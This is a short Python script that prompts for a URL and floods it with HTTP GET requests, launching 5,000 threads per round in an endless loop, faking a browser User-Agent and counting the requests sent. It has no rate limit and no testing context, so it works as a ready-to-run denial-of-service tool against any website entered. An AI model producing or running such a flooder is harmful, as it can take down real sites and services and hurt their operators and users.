import requests
import threading
from collections import Counter

# Prompt user for URL
url = input("Enter URL: ")

# Define function to send GET requests
def send_request(counter):
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'}
    try:
        response = requests.get(url, headers=headers)
        if response.status_code == 200:
            print("Sent green with status code", response.status_code)
        else:
            print("Sent with status code", response.status_code)
    except:
        print("Error")
    counter.update([1])

# Define function to send multiple requests using threads
def send_requests():
    counter = Counter()
    while True:
        threads = []
        for i in range(5000):
            t = threading.Thread(target=send_request, args=(counter,))
            threads.append(t)
            t.start()
        for t in threads:
            t.join()
        print("Number of requests sent:", sum(counter.values()))

# Start sending requests using threads
send_requests()
